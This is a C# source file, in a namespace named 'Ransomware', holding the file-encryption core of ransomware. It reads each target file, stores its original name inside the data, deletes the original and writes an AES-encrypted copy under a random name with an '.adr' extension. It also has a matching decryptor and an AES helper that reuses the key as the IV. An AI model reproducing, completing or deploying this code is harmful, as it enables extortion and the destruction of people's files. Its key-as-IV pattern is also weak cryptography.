using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Ransomware
{
    public class ransomwareCryptoMod
    {
        public static string getRandomFileName()
        {
            string retn = "";
            string pair = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~=!@#$%^&*()-+|";
            Random rnd = new Random();
            for (int i = rnd.Next(7, 13); i-- > 0; ) retn += pair[rnd.Next(pair.Length)];
            return retn;
        }
        public static bool encryptFile(string orgFile, byte[] aesKey)
        {
            try
            {
                string fileDir = new FileInfo(orgFile).DirectoryName + @"\";
                string fileFullName = new FileInfo(orgFile).Name;
                string extName = new FileInfo(orgFile).Extension;
                if (extName == "") return false;
                
                Byte[] fileData = File.ReadAllBytes(orgFile);
                Byte[] fullNameArray = Encoding.UTF8.GetBytes(fileFullName);
                if (fullNameArray.Length > 255) return false;
                Array.Resize(ref fileData, fileData.Length + 256);
                Array.ConstrainedCopy(fullNameArray, 0, fileData, fileData.Length - 256, fullNameArray.Length);
                File.Delete(orgFile);
                File.WriteAllBytes(fileDir + getRandomFileName() + ".adr", AES.encrypt(fileData, aesKey));
                return true;
         
            }
            catch (Exception)
            {
            }
            return false;
        }
        public static bool decryptFile(string orgFile, Byte[] aesKey)
        {

            try
            {
                string fileDir = new FileInfo(orgFile).DirectoryName + @"\";
                string extName = new FileInfo(orgFile).Extension;
                string fileName = new FileInfo(orgFile).Name.Split('.')[0];
                if (extName != ".adr") return false;

                Byte[] fileData = File.ReadAllBytes(orgFile);
                fileData = AES.decrypt(fileData, aesKey);
                Byte[] fileOrgExtName = new byte[256];
                Array.ConstrainedCopy(fileData, fileData.Length - 256, fileOrgExtName,0, 256);
                string fullName = Encoding.UTF8.GetString(fileOrgExtName);
                fullName = fullName.TrimEnd('\x00');
                Array.Resize(ref fileData, fileData.Length - 256);
                File.WriteAllBytes(fileDir + fullName, fileData);
                File.Delete(orgFile);
                return true;
      
            }
            catch (Exception)
            {
            }
            return false;
        }
    }
    public class AES
    {
        //http://boywhy.blogspot.tw/2015/04/c-aes.html
        public static Byte[] generateKey()
        {
            var AESObject = new RijndaelManaged() { KeySize = 128 };
            AESObject.GenerateKey();
            return AESObject.Key;
        }
        public static Byte[] encrypt(Byte[] data, Byte[] key)
        { 
            RijndaelManaged provider_AES = new RijndaelManaged();
            provider_AES.KeySize = 128;
            ICryptoTransform encrypt_AES = provider_AES.CreateEncryptor(key, key);
            byte[] output = encrypt_AES.TransformFinalBlock(data, 0, data.Length);
            return output;
        }

        public static Byte[] decrypt(byte[] byte_ciphertext, Byte[] key)
        {
            RijndaelManaged provider_AES = new RijndaelManaged();
            provider_AES.KeySize = 128;
            ICryptoTransform decrypt_AES = provider_AES.CreateDecryptor(key, key); 
            byte[] byte_secretContent = decrypt_AES.TransformFinalBlock(byte_ciphertext, 0, byte_ciphertext.Length);
            return byte_secretContent;
        }  
    }
}
